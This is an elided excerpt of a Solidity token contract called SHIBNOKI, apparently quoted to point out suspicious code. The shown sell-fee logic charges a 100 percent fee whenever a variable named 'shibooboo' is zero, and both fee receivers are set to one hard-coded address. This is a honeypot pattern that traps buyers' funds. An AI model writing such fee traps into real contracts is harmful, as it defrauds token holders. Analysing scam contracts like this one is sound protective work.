...
contract SHIBNOKI is ERC20, Auth {
    ...
    string constant private _name = "SHIBNOKI";
    string constant private _symbol = "SNOKI";
    ...
    address private autoLiquidityReceiver = 0xf6519f4FEe36814A136e28B6e0cA3efbe4Cc5c18;
    address private MarketingFeeReceiver = 0xf6519f4FEe36814A136e28B6e0cA3efbe4Cc5c18;
    ...
    function takeSellFee(address sender, uint256 amount) internal returns (uint256){
        ...
        uint256 feeAmount = amount.mul((shibooboo>0?totalSellFee:100).sub(sellFeeBurn)).div(feeDenominator);
